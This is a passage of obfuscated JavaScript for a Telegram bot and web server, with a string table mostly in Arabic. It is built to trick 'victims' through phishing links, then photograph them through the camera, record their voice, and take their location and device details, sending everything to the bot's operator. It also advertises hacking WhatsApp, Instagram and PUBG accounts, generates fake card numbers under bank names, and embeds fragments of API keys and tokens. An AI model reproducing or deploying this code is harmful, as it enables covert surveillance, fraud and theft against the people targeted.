        fs[_0x5c5eae(0x5db) + _0x5c5eae(0x179)](_0x114585, _0x4c8dc6), bot[_0x5c5eae(0x7c5)](_0x26ab58, _0x114585, { 'caption': _0xaf0464[_0x5c5eae(0x7a3)] })[_0x5c5eae(0x39c)](() => {
            const _0x2ca7cb = _0x5c5eae;
            console[_0x2ca7cb(0x3f8)](_0x2ca7cb(0x74c) + _0x2ca7cb(0x6c2) + _0x2ca7cb(0x600) + _0x2ca7cb(0x209) + _0x26ab58), _0x51b344[_0x2ca7cb(0x1a1)](_0xaf0464[_0x2ca7cb(0x82a)]);
        })[_0x5c5eae(0x732)](_0x4a3ec0 => {
            const _0x37330e = _0x5c5eae;
            console[_0x37330e(0x44a)](_0xaf0464[_0x37330e(0x742)], _0x4a3ec0), _0x51b344[_0x37330e(0x866)](-0x10d6 + 0xc70 * -0x2 + 0x2baa)[_0x37330e(0x82e)](_0xaf0464[_0x37330e(0x715)]);
        });
    } catch (_0x3c8f42) {
        console[_0x5c5eae(0x44a)](_0xaf0464[_0x5c5eae(0x5a5)], _0x3c8f42), _0x51b344[_0x5c5eae(0x866)](-0x1474 + 0x16b1 * 0x1 + -0x49 * 0x1)[_0x5c5eae(0x82e)](_0xaf0464[_0x5c5eae(0x47f)]);
    }
}), app[_0x54baf1(0x2e2)](_0x54baf1(0x754), (_0x3aa05c, _0x3dbbdb) => {
    const _0x204230 = _0x54baf1, _0x1138b0 = { 'GsYez': _0x204230(0x24c) };
    _0x3dbbdb[_0x204230(0x7bf)](path[_0x204230(0x45e)](__dirname, _0x1138b0[_0x204230(0x1ed)]));
});
let userRequests = {};
function _0x4e41() {
    const _0x5790aa = [
        'XBpny',
        'كمبوديا\x20🇰🇭',
        '-\x20نوع\x20الات',
        'rgJAN',
        'مل\x20السابق\x20',
        'يل\x20بعد\x20🗳</',
        'Xpgna',
        'JwWTY',
        '\x20الي\x2030\x20نط',
        'في\x20هذا\x20الد',
        'yfBec',
        'باراغواي\x20🇵🇾',
        'board',
        'نامج\x20وحذف\x20',
        'PacUL',
        'ynJZg',
        'ges',
        'ها\x20رقمي\x20ول',
        'https://fo',
        'LOcTD',
        'المطور\x20قبل',
        'الإمارات\x20🇦🇪',
        'search_ima',
        'أرمينيا\x20🇦🇲',
        'س\x20لديك\x20ايم',
        'لرقام\x20الضح',
        '🇱🇺',
        'قم\x20بإرسال\x20',
        'XsRcx',
        'أفغانستان\x20',
        'ه\x20يمنيه\x20قص',
        'جداً\x20لا\x20تق',
        'رقم\x20في\x20وتس',
        'ojZhy',
        'شاء\x20⏰\x20:\x20',
        '🇱🇻',
        'utf8',
        'OmJkh',
        'إسبانيا',
        'BbPyS',
        'ode>',
        'TQjUB',
        'نيبال\x20🇳🇵',
        'lBbyM',
        'nwEDX',
        'startsWith',
        'imageDatas',
        'ا\x20الرجاء\x20ا',
        'DWMph',
        'سلوفينيا\x20🇸🇮',
        'RNjLy',
        'toString',
        'oiEgv',
        '🇺🇿',
        'send',
        'FBaqa',
        'esponse',
        'images',
        '\x20sent\x20phot',
        'zJNeJ',
        'غيل:\x20',
        'yHkKO',
        '.txt',
        '➖\x20رمز\x20الدو',
        '<strong>لي',
        't-break',
        'sendMessag',
        'ا\x20الامر\x20/V',
        'photos',
        '\x22scope\x22:\x22p',
        'MujaS',
        'yZkmU',
        '/completio',
        'lstatSync',
        ':\x20\x0a\x20اليوزر',
        'الهند\x20🇮🇳',
        'ي\x20ع\x20الكثير',
        'MJdjp',
        '<strong>قم',
        'dNcQP',
        'ي\x20كلمة\x20الب',
        '/captureFr',
        '🇵🇷',
        'SIGTERM',
        'ابط\x20دعوة.',
        '🇸🇻',
        'values',
        '/F.html?ch',
        '0\x20(Windows',
        'اختراق\x20ببج',
        'listen',
        'capture_vi',
        '\x20فاير',
        'ال\x20معرف\x20ال',
        'NGcPm',
        'م\x20مستخدم',
        'سوريا\x20🇸🇾',
        'iry\x20:*\x20`',
        'https',
        'البوسنة\x20وا',
        'س\x20لديك\x20إيم',
        'i.html',
        'سلوفاكيا\x20🇸🇰',
        'يه\x20الاصيله',
        '/getNam',
        'DkKLb',
        'bio',
        '/getName',
        '🇫🇮',
        '\x20أي\x20إيميل\x20',
        'status',
        ':</strong>',
        'اول\x20مره\x20اخ',
        'getItem',
        'RtEny',
        'me/)\x20\x0a*Pre',
        'HGtxf',
        'multer',
        '\x20الرسالة.\x20',
        'snkJg',
        '\x20الرسائل:',
        'مالطا\x20🇲🇹',
        'rvuDA',
        'body-parse',
        'hKDGW',
        'cMpOT',
        'trong>',
        'networkTyp',
        'iCVAg',
        'mkdirSync',
        'TpEJY',
        'PFuQp',
        '\x20🧠\x0a-\x20الذاك',
        'age',
        'TLuGi',
        'OjWrA',
        'ryRNB',
        'RkFui',
        'ss\x20the\x20but',
        'GKAER',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20',
        'ber',
        '*[-]\x20Card\x20',
        '`\x0a*=======',
        'uSPsI',
        'base64',
        'أرسل\x20لي\x20را',
        'i.openai.c',
        'MDNpA',
        'ing\x20Telegr',
        'DUmSQ',
        '➖\x20اضغط\x20ع\x20ا',
        'تم\x20استخدام',
        'د\x20الأنوية:',
        'store',
        'latitude',
        'VWmpv',
        'repeat',
        'https://mo',
        'Received\x20p',
        'بيلاروس\x20🇧🇾',
        'ي\x2030\x20نقطه\x20',
        'أذربيجان\x20🇦🇿',
        '\x20إيميل\x20وهم',
        'YJIcKlujfP',
        ']\x2075%',
        's24.me/en/',
        'هونغ\x20كونغ\x20',
        'nt:',
        'Frequency',
        'Error\x20proc',
        'WcBCC',
        'VfohM',
        'إسبانيا\x20🇪🇸',
        'ان\x20تخترقك\x20',
        'ع\x201نقطه\x20عن',
        'kGPLM',
        'cpuCores',
        '<strong>حد',
        'https://sm',
        'لمميزات\x20تل',
        'لقد\x20قام\x20ال',
        'الضحية\x20🎤',
        'قر\x20على\x20الز',
        'gaWzo',
        'AUmLU',
        'ميله\x20ومحرج',
        '\x20و\x20',
        'www',
        'وله\x20يمكنك\x20',
        'دولة\x20غير\x20م',
        'com',
        'بط\x20جديد\x20',
        '/email/',
        'TaENr',
        'uorescent-',
        'aKCzC',
        'userLink',
        'HVIIZ',
        'OyZqG',
        '\x20اخره\x20لاحق',
        'gSFcs',
        'ية\x20📷',
        '==========',
        'dLsXW',
        'sendVoice',
        'linkId',
        'قه\x20عاليه:\x20',
        'إلغاء\x20اشتر',
        'البحث\x20عن\x20ص',
        'ية\x20فيديو\x20🎥',
        'qcOww',
        'صه\x20لمن\x20نجد',
        'zFIaz',
        'زامبيا\x20🇿🇲',
        'لاتفيا',
        'د\x20لنسخه</s',
        'ALZXa',
        'IWuas',
        'تم\x20إنشاء\x20ا',
        'فشل\x20في\x20إرس',
        'nTltk',
        '<strong>•\x20',
        'FwuDQ',
        'الخادم\x20يعم',
        'MziXV',
        'code',
        '10mb',
        'RqnoQ',
        'ستخدمين.',
        'خول\x20لرابط\x20',
        '7qpQVXc',
        'hex',
        '/submitNam',
        'hflEF',
        'XVbYt',
        'jhJkl',
        'ذا\x20الرابط\x20',
        '\x20📡\x0a-\x20الوقت',
        'عزيزي\x20حمود',
        '.mp4',
        'جزر\x20كايمان',
        'Kit/537.36',
        'شخص\x20جديد\x20د',
        '🇺🇸',
        'i.internal',
        'ساحل\x20العاج',
        'sPTzC',
        'ى\x20صورة\x20الم',
        'ك\x20VIP',
        'GltNh',
        'rification',
        'lo.html',
        'xIqPr',
        'ike\x20Gecko)',
        'nvite',
        'rdzNS',
        'send\x20video',
        'chatId',
        'ه\x20لنه\x20يحتو',
        'fSTPz',
        'number',
        'last_name',
        'chVdR',
        'القائمة:\x20',
        'اكرة\x20المؤق',
        'KhyUy',
        'F.html',
        'countryCod',
        'رة\x20الداخلي',
        '/g.html?ch',
        '\x20Chrome/11',
        'UzWxb',
        'م\x20هذا\x20هو\x0a:',
        'لاتفيا\x20🇱🇻',
        'mlAOM',
        '➖\x20الدوله\x20:',
        'سو\x20🇧ﺫ',
        '🇨🇷',
        'إيطاليا\x20🇮🇹',
        'ء\x20جلب\x20الرس',
        '\x20Visa...\x0a[',
        'essage',
        '.insecam.o',
        'fari/537.3',
        '🇦🇫',
        'OAdOk',
        'و\x20حاول\x20مره',
        'AoLHQ',
        'setItem',
        'whatsapp.c',
        'resource_r',
        'static',
        'رابط\x20جمع\x20ا',
        'body',
        'BpLYV',
        '\x20الرجاء\x20تغ',
        '\x20🖥️\x0a-\x20وضع\x20ا',
        'facebook.c',
        'تصفير\x20الذا',
        'ور\x20ابحث\x20عن',
        '\x20🔁',
        'بوك\x20🔮',
        'بنجاح\x20✅',
        'ط\x20🔒',
        'ود\x20🇲🇪',
        'الحصول\x20على',
        'phoneNumbe',
        'ضحيه\x20في\x20اد',
        'rbo',
        'اختراق\x20فيس',
        'AuFOu',
        'vice_info',
        'شاءه\x20\x20/an\x0a',
        '\x20بإنشاء\x20حس',
        'mWdsM',
        'eenky',
        'isa',
        '\x20الحساب:*\x0a',
        'contact',
        '.com',
        'bJuBf',
        'jyqvD',
        'لرابط\x20ملاح',
        '\x20على\x20رقم\x20و',
        'KPWOW',
        'ync',
        'vUcNE',
        'ixUiI',
        'query',
        'غط\x20على\x20الز',
        '\x20\x20\x20\x20',
        'TDFoh',
        'buffer',
        'https://iw',
        '🇪🇪',
        '\x20يزال\x20مشبو',
        'عروفة',
        'لشاشة:\x20',
        't)\x0a\x20\x20\x20\x20\x20\x20',
        'CVGMs',
        'حدث\x20خطأ\x20أث',
        'تم\x20لغيم\x20ال',
        'بليز\x20🇧🇿',
        'slice',
        'Wells\x20Farg',
        'lMXef',
        'countryNam',
        'parse',
        'uejzg',
        '▓░░░░░░]\x205',
        'WBZIA',
        '\x20الحصول\x20عل',
        'BWUTb',
        '\x20الضحيه\x20بد',
        'deviceType',
        'test',
        'ton\x20below\x20',
        'مستخدم\x20لإض',
        '\x20الثانية)\x0a',
        'مرحبًا!\x20بك',
        'message_id',
        '/record/:l',
        'cXubM',
        '*اليوزر\x20:\x20',
        'ldNnL',
        'redirect',
        'uery',
        'mdRZqoXRZ_',
        'لف\x20الشخصي:',
        '\x20الرابط:\x20',
        'otocol',
        '\x20يتم\x20إنشاء',
        'bluetoothS',
        'كرواتيا\x20🇭🇷',
        'وله\x20بسبب\x20ق',
        'j1u7p1lXXG',
        'nChwt',
        'ر\x20الدوله\x20ا',
        'hing\x20love\x20',
        'hostname',
        'memoryStor',
        'لقد\x20قام\x20ضح',
        'إندونيسيا',
        'لضحيه\x20فيدي',
        '**\x0a-\x20الدول',
        'AlKKo',
        'applicatio',
        'wYjRD',
        '🇭🇰',
        'er.glitch.',
        'من\x20أنك\x20لست',
        'التمتع\x20في\x20',
        'rg/en/byco',
        'بانه\x20مشبوه',
        'oTVfm',
        'glitch',
        'لقائي\x20',
        'btZHQ',
        'LARtI',
        'hBxGw',
        '\x0a<code>',
        'المشاهده\x20ع',
        'waiting_fo',
        'مرحبًا!\x20ان',
        'UpHby',
        'ziCYH',
        '9092058wqinZm',
        'Your-User-',
        'غرينلاند\x20🇬🇱',
        'JHiMY',
        'get_camera',
        'بك!\x20وحصلت\x20',
        'numbers/',
        'ابدأ\x20الاخت',
        'node-teleg',
        'quest:\x20Mis',
        'الفلبين\x20🇵🇭',
        '\x20جهة\x20الاتص',
        '\x20\x22https\x22.',
        'يره\x20جداً\x20ب',
        'ن\x20🇩🇴',
        'ال\x20للتحقق.',
        'ميانمار\x20🇲🇲',
        'qjYQl',
        '/s.html?ch',
        'ZII0_bot',
        'd\x20or\x20video',
        'TEKUJ',
        '🇳🇮',
        'ة\x20الاتصال',
        'aZSam',
        'كازاخستان',
        'نيكاراغوا\x20',
        'uery\x22:\x22',
        'nmxrl',
        '\x20(KHTML,\x20l',
        'Citibank',
        'sqVwx',
        'QjugU',
        'once',
        'TustP',
        'GsYez',
        '🇷🇸',
        'بوليفيا\x20🇧🇴',
        'unlinkSync',
        'VUFDA',
        'رجيه\x20لكتشا',
        '`\x0a*[-]\x20Exp',
        'YSUYo',
        '/record/',
        'ntJIZ',
        'طة.\x0a:\x20http',
        'QAYgc',
        'MGOZP',
        'الرجاء\x20الم',
        '🇬🇧',
        '\x20أثناء\x20جلب',
        '/k.html?ch',
        'لاوس\x20🇱🇦',
        'check_link',
        'غواتيمالا\x20',
        'securityPr',
        'get_freefi',
        'اوت',
        'WhEJr',
        'يات\x0aتصاميم',
        'الصوره📸\x20',
        'member',
        'getChatMem',
        'Id\x20',
        'امر\x20التالي',
        'ظه\x20بزم\x20يكو',
        'rest-plaus',
        '/whatsapp?',
        'get_joke',
        '\x20لتقنية\x20ال',
        'صله\x20اضع\x20في',
        '\x20في\x20جهاز\x20ا',
        'دما\x20تصل\x20ال',
        'المكسيك\x20🇲🇽',
        'PlZtl',
        'FalgD',
        '\x20الذكاء\x20ال',
        'ddWXf',
        'sing\x20chatI',
        'toISOStrin',
        'يرات\x20المرا',
        'HDRzP',
        'nPsXM',
        'WvcEw',
        'MuPsq',
        'لة\x20حالياً',
        'nyIKI',
        'battery',
        'لرجاء\x20المح',
        'readFileSy',
        'احصل\x20على\x20ر',
        'ObCyD',
        'dAtxj',
        'تصوير\x20الضح',
        'ب\x20شات\x20⭐',
        'ات\x20الجهاز:',
        '*الاسم\x20:\x20',
        'ياء\x20🧠',
        'deo',
        'ث\x20خطأ\x20أثنا',
        'ata:',
        'ليتوانيا\x20🇱🇹',
        'XBjwN',
        '\x20على\x20معلوم',
        'ابط.',
        'ق\x20كامراة\x20م',
        'راق\x20كامراة',
        'NSZgM',
        'aScVe',
        'next_',
        'rshq_insta',
        'WjJSA',
        'مرحبا!\x20في\x20',
        'بحث\x20عن\x20صور',
        'Chase\x20Bank',
        'results',
        'uesRw',
        'إثيوبيا\x20🇪🇹',
        'dafWr',
        'request_co',
        'PwlMQ',
        'ta\x20found\x20o',
        'الصورة:',
        '\x20تلقائي\x20',
        'ف\x20\x20رساله\x20ج',
        'Bearer\x20sk-',
        'instagram',
        'لهاتف\x20يشحن',
        'لمستخدم\x20',
        'vAQsB',
        'ca.html',
        'user_id',
        'gTfgR',
        '\x20عاليه\x20🖼',
        'ل\x20عن\x20800حر',
        'تم\x20التحقق\x20',
        'التردد\x20للا',
        '\x20complete',
        'مستخدم\x20لإز',
        '▓▓▓░░░░]\x207',
        'باكستان\x20🇵🇰',
        'RJuVS',
        'بورتوريكو\x20',
        'dotenv',
        'filePhotos',
        'لي30\x20نقطه\x20',
        'axios',
        'Mozilla/5.',
        'fuschia-lo',
        '\x0aانمي\x0aوالم',
        'lEARH',
        'EZlgM',
        'تم\x20تصنيفه\x20',
        'city',
        'زيمبابوي\x20🇿🇼',
        'lBdFW',
        'اعطيني\x20نكت',
        'body_text',
        'تركمانستان',
        'k.html',
        'rYZDK',
        'لرقم\x20لنسخه',
        '🇰🇿',
        'ناء\x20إرسال\x20',
        'اختراق\x20انس',
        'لم\x20يتم\x20الت',
        'agram',
        '▓▓▓▓▓▓░░░░',
        '\x20الرابط\x20بش',
        'am\x20message',
        '/email/new',
        'NFALb',
        'An\x20error\x20o',
        'ed.',
        'علومات\x20الج',
        'TwGrf',
        'المجر\x20🇭🇺',
        'ucpeq',
        'FHVKC',
        '\x20✋\x0a\x20\x20\x20\x20\x20\x20\x20',
        'نيوزيلندا\x20',
        '\x20الجهاز',
        'اب\x20سريعاً\x0a',
        'Generate\x20V',
        'امرا\x20الأما',
        '\x20آخر\x20تحديث',
        'YZTCw',
        'VBsGi',
        'PORT',
        '\x20•\x20التصنيف',
        'OtULF',
        'تفسير\x20الأح',
        'ائل</stron',
        'ImjBq',
        'كوستاريكا\x20',
        'لقد\x20تم\x20وصو',
        'info.io/',
        'أرسل\x20لي\x20اا',
        'وامر\x20اخترا',
        '?start=',
        'ل\x20وهمي',
        'تصال:\x20',
        'emails.jso',
        'أوزبكستان\x20',
        '░░░░░░░░░░',
        'ظر\x20عن\x20رقمي',
        'Clearing\x20c',
        '\x20•\x20معلومات',
        'IcEVD',
        'رى\x20لاحقًا.',
        'hw.vercel.',
        'م\x20الهاتف\x20☎️',
        '53050phhsgE',
        'سيتم\x20تصوير',
        'utu.be',
        'kttUV',
        'اب\x20أولاً</',
        'TauHD',
        'تعامل\x20معه\x20',
        't.com/reso',
        'إضافة\x20مستخ',
        '🇸🇪',
        '🇩🇰',
        'every',
        'امريكا\x20🇺🇸',
        'EQYAA',
        'ن\x20العثور\x20ع',
        'Capital\x20On',
        '&duration=',
        'qlJgy',
        'أوغندا\x20🇺🇬',
        'YERnc',
        'ال\x20معلومات',
        'بمرجد\x20الدخ',
        'frpYe',
        '/getLocati',
        'فرنسا\x20🇫🇷',
        'بنما\x20🇵🇦',
        'jKhOb',
        'PhiuG',
        'd\x20Bank',
        '\x20على\x20الزر\x20',
        '<strong>لم',
        'iQrJx',
        '7171480zyiwha',
        'عبر\x20رابط\x20🔒',
        'Received\x20d',
        'جزر\x20فارو\x20🇫🇴',
        'cheerio',
        'الذي\x20يمكن\x20',
        '\x20موجود:\x20',
        '`\x0a*[-]\x20Ban',
        'lastUpdate',
        'لى\x20رابط\x20ال',
        'سويسرا\x20🇨🇭',
        'لألوان:\x20',
        'KdsAf',
        'chat',
        '🇵🇹',
        'ير\x20هذا\x20الر',
        'Jorws',
        'bvARx',
        'ة...',
        'بطًا\x20يبدأ\x20',
        '▓▓▓▓▓▓▓]\x201',
        'urZQf',
        'file',
        'CAYlJ',
        'RIrJR',
        'CLASSIC',
        'شرح\x20البوت\x20',
        '<strong>ال',
        'مصر\x20🇪🇬',
        'لنسخها.',
        'ار\x20الايمل\x20',
        'ر\x20لتوليد\x20ر',
        '1168cdwlhb',
        'رجاء\x20\x20عدم\x20',
        'me/VlP_12',
        'موزمبيق\x20🇲🇿',
        'get',
        'crypto',
        'Advwu',
        'lOXak',
        'ماليزيا\x20🇲🇾',
        'ل\x20بعد\x20🗳ً</',
        'rEyIN',
        'أخرى\x20لاحق😁',
        'ابط\x20التقاط',
        '<strong>جا',
        '/strong><c',
        'YXnvv',
        'cErSL',
        'ated-drift',
        'HYmUT',
        '.jpg',
        'كازاخستان\x20',
        'افته\x20كـ\x20VI',
        'FxhjO',
        'Verificati',
        'substring',
        '/captureBa',
        '/imageRece',
        'لضحيه\x0a:\x20',
        'ation',
        'ing\x20video:',
        'ع\x201نقطه\x20\x0aع',
        'ank',
        'mmtxa',
        '/submitVoi',
        '\x20المستخدم:',
        'sGJIO',
        'CFINj',
        'config',
        'screenOrie',
        'type',
        'إزالة\x20مستخ',
        'ساب\x20🟢',
        'qjIfk',
        'ZPItn',
        'عندما\x20\x20تصل',
        'QZKQo',
        'tOMsh',
        'تم\x20تلغيم\x20ه',
        'jXsmN',
        'gwgCA',
        '🇫🇷',
        'pin',
        'توباغو\x20🇹🇹',
        'أوكرانيا\x20🇺🇦',
        'م\x20استلمها\x20',
        'ormalize_f',
        'uybFO',
        'creator',
        'صي.',
        'ريونيون\x20🇷🇪',
        '\x20🇹🇲',
        'HkFPd',
        '4741bTxbZB',
        'meString',
        '\x2030\x20نقطه\x20ي',
        'ngan.glitc',
        'يه\x20لمعرفة\x20',
        'onrender',
        'من\x20هذا\x20الد',
        'SIGINT',
        'ه\x20بنسبه\x20لن',
        'lpBYV',
        'k\x20:*\x20`',
        'vPeuR',
        'جورجيا\x20🇬🇪',
        'بولندا\x20🇵🇱',
        '\x20لنه\x20تم\x20فح',
        'Processing',
        'وخاصه\x20اذا\x20',
        '4.com',
        't.me',
        '.png',
        'sMxeY',
        'phone_numb',
        'اختراق\x20وات',
        'remove_vip',
        'الإكوادور\x20',
        'RpyQY',
        'كرة\x20المؤقت',
        '\x20رابط\x20لالت',
        '/json',
        '\x20انشـاء\x20بر',
        'https://ww',
        '/de\x0a\x0a<stro',
        'بـ\x20\x22https\x22',
        'ViqyB',
        't?start=',
        'ير\x20chatId\x20',
        'mRAYe',
        'اب\x0aافتيارا',
        'match',
        'ذا\x20\x20الرابط',
        'network',
        'أيرلندا\x20🇮🇪',
        '\x20📶\x20(سرعة:\x20',
        'random',
        '\x20توك\x20📳',
        'uHiMw',
        '\x20⚙️\x0a-\x20لغة\x20ا',
        'n/json',
        'deleteMess',
        'eTaDg',
        'تم\x20اكتشاف\x20',
        'ZBRIh',
        'MsZiW',
        'language',
        'ng>يرجى\x20ات',
        '▓▓░░░░░░░░',
        'xwnen',
        '\x20🌐\x0a-\x20إصدار',
        'ألبانيا\x20🇦🇱',
        'ح\x20المميزات',
        'jcUlB',
        'لمتصفح:\x20',
        'geolocatio',
        'ة:\x20',
        'ًا.',
        'FPQst',
        'administra',
        'hatId=',
        'ال\x20للتحقق\x20',
        'link',
        'ل\x20على\x20المن',
        'لحذر\x20مع\x20ال',
        'screenReso',
        'qvygF',
        'بوركينا\x20فا',
        'اليونان\x20🇬🇷',
        'ث\x20عن\x20صور.\x0a',
        'ت\x20الجهاز',
        '-umber.ver',
        '&type=inst',
        'تصوير\x20بدقه',
        'LmgXE',
        '*الايدي\x20:\x20',
        'أمريكا',
        'لاستخراج',
        'request_ve',
        'touchSuppo',
        'مالي\x20🇲🇱',
        'AHwps',
        'rning-anim',
        'الدومينيكا',
        'ابط\x20الخاص\x20',
        '</code>\x0a<s',
        'مرحبًا!\x20هذ',
        'chatId=',
        '/so',
        'sion',
        'SrLsj',
        'connection',
        'HDiJM',
        'd\x20Type\x20:*\x20',
        'eaHsy',
        'earchResou',
        '\x0a\x0aاضغط\x20على',
        'on...\x0a[░░░',
        'GgwYV',
        'لوحة\x20التحك',
        'بيرو\x20🇵🇪',
        '\x20الأرقام:',
        'لهجه\x20اليمن',
        'bszrY',
        'ط\x20خمس\x20مرات',
        '\x20لك\x0a\x20يوجد\x20',
        'UBFSm',
        'لم\x20تفتح\x20ال',
        '\x0a\x20\x20\x20\x20\x20\x20\x20\x20•',
        'لصورة\x20بنجا',
        '\x20النقاط\x20وف',
        'rYGUS',
        '🇪🇸',
        '2DOs-Fgdwp',
        'aIjry',
        '\x0a📱\x20**معلوم',
        'ddbsv',
        'تغير\x20الرقم',
        'secondName',
        'نيجيريا\x20🇳🇬',
        'IQIln',
        'then',
        '\x20إلى\x20التلغ',
        'replit',
        'خال\x20رقم\x20ال',
        'bUHrv',
        'total_coun',
        '@oapajh',
        '\x20استخدام\x20ا',
        '\x20الجهاز:\x20',
        '🇮🇩',
        'callback_q',
        '\x20📜\x0a-\x20نوع\x20ا',
        'get_link_',
        'qbzLr',
        'ترينيداد\x20و',
        'ت\x20خبيثه\x20خا',
        'ZUTKe',
        '\x20المحظور\x20م',
        'SjWCg',
        'http://www',
        '*\x0a\x0a',
        'osVersion',
        'CuACh',
        '&type=tikt',
        'مدفوع\x20بسعر',
        'skyBs',
        '\x20للمتصفح:\x20',
        'لذي\x20رسلك\x20ه',
        'إيقاف\x20البر',
        'لا\x20بك\x20:\x20|\x20',
        'UsSCV',
        'SunTrust\x20B',
        'https://cu',
        '`\x0a*[-]\x20CVV',
        '➖\x20المنصه\x20🔮',
        'لعبة\x20الأذك',
        'creationDa',
        '%\x20🔋\x0a-\x20هل\x20ا',
        '_pins/?q=',
        'راق',
        'HTML',
        'create_ema',
        'nyZfT',
        'بلوتوث:\x20',
        'omWdL',
        'rmdirSync',
        'WcVwj',
        'لقد\x20تم\x20اخت',
        'PVIze',
        '\x20📡\x0a-\x20إمكان',
        'للمسية:\x20',
        '*👤\x20معلومات',
        'Win64;\x20x64',
        'ام\x20بنجاح.',
        'dns',
        'اشترك\x20في\x20',
        'essing\x20vid',
        'rong>\x0a\x20\x20\x20\x20',
        'gKDoh',
        'تم\x20إزالة\x20ا',
        '5Iw5wkVItL',
        'في\x20الطلب.',
        'urce/BaseS',
        'نة:\x20',
        'ر\x20لجمع\x20معل',
        '📞\x20إرسال\x20جه',
        'iJHvK',
        'ل\x20كود\x20الرق',
        'de_',
        'longitude',
        'ice.glitch',
        'sRWfF',
        '\x27m*\x20[™](t.',
        'آمن\x20🟢',
        '░░░░░░░]\x200',
        'generate_i',
        'gram',
        'ستقبال\x20الا',
        'إغلاق\x20المو',
        '\x20و\x20الحذر\x20م',
        'وبية\x20🇰🇷',
        'لام\x20أي\x20رسا',
        'for\x20chatId',
        'CiTJp',
        'جاري\x20اخترا',
        'zytWU',
        'ram-bot-ap',
        'PNC\x20Bank',
        'GJzGD',
        'mFXJT',
        'قائي.',
        'W5B7mU',
        'log',
        'إستونيا',
        'قطر\x20🇶🇦',
        'XzQuu',
        '\x20أسماء\x20الم',
        'التحكم:',
        'UlBuI',
        'email\x0a\x0aلظه',
        'ont/:linkI',
        'WNfIC',
        'الرقام\x20وهم',
        'r\x20data\x20for',
        '🇪🇨',
        'غيرنزي\x20🇬🇬',
        'ابط\x20لإضافة',
        'existsSync',
        'ضغط\x20على\x20هذ',
        'غانا\x20🇬🇭',
        'OYSLe',
        'nuwua',
        'اختراق\x20الم',
        'MUrlb',
        'لنظام:\x20',
        'oOyoe',
        'تم\x20اختراق\x20',
        '░░░░░░░]\x202',
        'سحب\x20جميع\x20ا',
        'reply_mark',
        'تم\x20انشاء\x20ا',
        'إستونيا\x20🇪🇪',
        'مكنك\x20تجميع',
        '\x20سابقاً\x20هو',
        'لا\x20توجد\x20صو',
        'ي\x20🕹',
        '\x20أثناء\x20محا',
        'فرمتة\x20جوال',
        'بلجيكا\x20🇧🇪',
        '\x20فاير\x20👾',
        'IYlpQ',
        'زيد\x20من\x20الص',
        'get_photo_',
        'yCLmK',
        'UIvFI',
        'each',
        'انشاء\x20📅\x20:\x20',
        'mm.html',
        'رة\x20(RAM):\x20',
        'YrPTq',
        'كاليدونيا\x20',
        'eqhqE',
        'قع\x20والبرام',
        'nOisq',
        'backQuery',
        '`\x0a*[-]\x20Car',
        'ميع\x20قنوات\x20',
        '\x20:\x20`',
        'hgWoM',
        '+7KZ',
        'KYINS',
        'ي\x20راسك....',
        'صربيا\x20🇷🇸',
        'لرابط\x20إليك',
        '🇨🇲',
        'Error\x20fetc',
        'عمان\x20🇴🇲',
        'g.html',
        '\x20📊\x0a-\x20دقة\x20ا',
        'on...\x0a[▓▓░',
        '\x20من\x20الخورز',
        '▓▓▓▓▓▓▓▓▓▓',
        'voice',
        'ر\x0aاقتراحات',
        'لموقع\x20الجغ',
        'الأرجنتين\x20',
        'XwWSn',
        'إندونيسيا\x20',
        'Thikj',
        'بريطانيا\x20🇬🇧',
        '\x20مهمه\x20اذا\x20',
        'deviceVers',
        'beRTh',
        '\x0aلعرض\x20الرس',
        'error',
        'م\x20في\x20طلب\x20ك',
        'king\x20subsc',
        'آمن.',
        'tOmfU',
        '\x20📅\x0a-\x20بروتو',
        'azFYP',
        'QXQGl',
        '\x20النقاط\x20ال',
        'اكتب\x20لي\x20رس',
        'tinyurl',
        'rshq_faceb',
        'Generating',
        'رقم\x20الهاتف',
        'add_nammes',
        'on...\x0a[▓▓▓',
        'ه\x20\x0a:\x20https',
        'صيد\x20فيزات\x20',
        'trong>اضغط',
        'FkpLe',
        'join',
        'username',
        'firstName',
        'Bank\x20of\x20Am',
        'ري\x20انشاء\x20ا',
        'country',
        'لام\x20معلوما',
        'بط\x20دعوة',
        'رافي:\x20',
        'بـ\x20Pintere',
        'لمعلومات:\x20',
        'ioApx',
        'php',
        'neNumber',
        'sEIJi',
        '\x20🇨🇮',
        'لجهاز:\x20',
        'r.html',
        'فنزويلا\x20🇻🇪',
        ']\x2050%',
        'مؤقتة.',
        'ible-pract',
        'اق\x20وتساب\x0a:',
        'message:',
        'Error\x20chec',
        'IT\x20-\x20VISA\x20',
        '\x20المحتله\x20🇮🇱',
        'ccurred:',
        'خدمة:\x20',
        'gram:',
        'تونس\x20🇹🇳',
        'EfQtS',
        'first_name',
        'SGubm',
        'لروابط',
        'LKEbU',
        'seWwkhTzrZ',
        'رام.',
        'file_id',
        'ول\x20الي\x20الر',
        'النرويج\x20🇳🇴',
        'includes',
        'ل\x20وهمي\x20💌',
        'sGpIZ',
        'خره\x20او\x20حاو',
        'removeList',
        'حساب\x20جديد⚠️',
        'XmuTN',
        'ال\x20الخاصة\x20',
        'KMTVn',
        'getLocatio',
        'المغرب\x20🇲🇦',
        'zFBoG',
        'تم\x20استلام\x20',
        'الرجاء\x20توف',
        'sHeSX',
        'فلسطين\x20🇵🇸',
        'https://ap',
        'سيتم\x20فتح\x20ا',
        'NxoKA',
        'uuid',
        'rm?chatId=',
        'creationTi',
        'تشيلي\x20🇨🇱',
        'اختراق\x20فري',
        'إضافة\x20مشتر',
        '\x20على\x20صورة\x20',
        'اله\x20طويله\x20',
        '🇬🇹',
        '<strong>اه',
        'JWVjt',
        'ا\x20الخيارت\x20',
        'QaYvc',
        '\x20اي\x20صوره\x20ف',
        'الكاميرون\x20',
        'النمسا\x20🇦🇹',
        'lvjEF',
        'clck',
        'xOody',
        'atId=',
        'BfEYn',
        'آيسلندا\x20🇮🇸',
        'SnFSF',
        'SbEZX',
        'org',
        'tHSbZ',
        'فعل.\x20انتظر',
        'تجرام\x20🖥',
        'zwXXF',
        ':AAELOAVm0',
        '\x20انشاء\x20ايم',
        '🇳🇿',
        'Fifth\x20Thir',
        'ل\x20مره\x20اخرى',
        'دما\x20يقوم\x20ش',
        'xEVzj',
        'max',
        'BCLdN',
        'JoUsQ',
        'sendLocati',
        'الرجاء\x20إدخ',
        'JMaco',
        'إضافة\x20أسما',
        'إيران\x20🇮🇷',
        's.html',
        'videos',
        'kbyvZ',
        ']\x2025%',
        'KIhQa',
        'ة:</strong',
        'بك\x20فقط.',
        'trooX',
        'وشكرا.',
        '👨🏻‍🏫',
        'يد\x20وهمي\x20لا',
        'إختراق\x20ببج',
        '/ca',
        'NrhgK',
        '/:userId',
